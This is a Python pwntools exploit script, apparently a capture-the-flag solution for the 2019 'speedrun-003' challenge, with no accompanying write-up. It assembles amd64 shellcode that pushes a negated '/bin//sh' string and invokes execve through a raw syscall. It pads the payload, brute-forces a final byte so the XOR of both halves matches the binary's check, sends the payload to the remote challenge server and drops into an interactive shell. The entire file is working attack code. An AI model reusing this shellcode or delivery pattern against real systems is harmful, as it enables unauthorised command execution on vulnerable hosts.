from pwn import *

def xor(shellcode):
    r = 0
    for c in shellcode:
        r ^= ord(c)
    return r

elfpath = "speedrun-003"
sock = remote("speedrun-003.quals2019.oooverflow.io", 31337)
#sock = process(elfpath)

shellcode = asm("""
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
""", arch="amd64")
shellcode += b'A' * (0x1d - len(shellcode))

print(disasm(shellcode, arch='amd64'))

for c in range(0x100):
    if xor(shellcode[:15]) == xor(shellcode[15:] + chr(c)):
        shellcode += chr(c)
        break
else:
    print("ops")

sock.send(shellcode)

sock.interactive()
